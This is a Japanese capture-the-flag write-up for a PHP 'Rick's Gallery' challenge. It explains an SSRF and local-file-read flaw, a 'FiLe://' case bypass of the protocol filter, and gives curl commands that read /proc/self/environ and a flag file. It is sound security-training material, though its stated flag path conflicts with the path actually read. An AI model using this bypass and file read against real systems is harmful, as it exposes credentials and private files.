## Rick's Gallery

**URL**: http://65.109.194.105:8080/

## 問題概要

Rick & Mortyギャラリーアプリケーション。POSTリクエストでカスタムHTTPヘッダー`Image`を使用して画像パスを指定できる。

### アーキテクチャ

1. **index.php**: 
   - `Image`ヘッダーから画像パスを取得
   - プロトコルフィルター（`http://`, `php://`, `file://`など）とパストラバーサル（`../`）をブロック
   - 内部で`http://localhost:80/getpic.php`にcURLリクエスト

2. **getpic.php**: 
   - POSTパラメータ`picture_name`からファイルを読み込み、base64エンコードして返す
   - `.htaccess`により、localhostからのアクセスのみ許可

3. **フラグ**: `/flag-[ランダム24文字].txt`にリネームされている

## 脆弱性

- **SSRF + LFI**: `index.php`経由で内部の`getpic.php`にアクセスし、任意のファイルを読み取り可能
- **フィルターバイパス**: `file://`はブロックされているが、大文字小文字混在（`FiLe://`）でバイパス可能
- **Glob Pattern未対応**: `/flag-*.txt`のようなglobパターンは利用できない

## 解法

`file://`のケースバリエーション（`FiLe://`）でフィルターをバイパスし、フラグファイルを読み取る。

### エクスプロイト

```bash
# /proc/self/environで環境変数を確認
curl -X POST http://65.109.194.105:8080/index.php \
  -H "Image: FiLe:///proc/self/environ"

# フラグの場所を特定後、読み取り
curl -X POST http://65.109.194.105:8080/index.php \
  -H "Image: FiLe:///tmp/flag.txt"
# => QVNJU3tyMUNrX2g0ZF9Dbl83aDFzX0JlNH0K

# base64デコード
echo "QVNJU3tyMUNrX2g0ZF9Dbl83aDFzX0JlNH0K" | base64 -d
# => ASIS{r1Ck_h4d_Cn_7h1s_Be4}
```

## Flag

`ASIS{r1Ck_h4d_Cn_7h1s_Be4}`